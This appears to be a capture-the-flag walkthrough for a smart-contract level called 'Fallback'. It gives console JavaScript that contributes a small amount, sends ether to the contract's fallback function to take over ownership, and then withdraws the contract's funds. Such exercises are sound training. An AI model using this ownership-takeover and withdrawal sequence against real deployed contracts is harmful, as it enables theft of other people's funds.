# Fallback

**HINT:** Look at the fallback function
<details>
<summary> Part 1</summary>
<p>

```js
toWei('0.0001')
```
You'll get:
```
"100000000000000" 
```
This will show us how much to send to the contract
</p>
</details>

<details>
<summary> Part 2</summary>
<p>

```js
contract.contribute.sendTransaction({ from:player, value:'100000000000000'  })
```
We first need to contribute to the contract before calling the fallback function
To see if our transaction goes through, you can ether click the <b>rinkeby.etherscan.io link</b> given or use: 
```js
Number(await contract.getContribution())
```
</p>
</details>

<details>
<summary> Part 3</summary>
<p>

```js
contract.sendTransaction({ from:player, value:'100000000000000'  })
```    
This will override the ownership and then give you the player ownership<br></br>
You can then see your the owner now with: 
```js
await contract.owner()
```
</p>
</details>

<details>
<summary> Part 4</summary>
<p>

```js
await contract.withdraw()
```
That's it now just submit and you WIN!!!
</p>
</details>
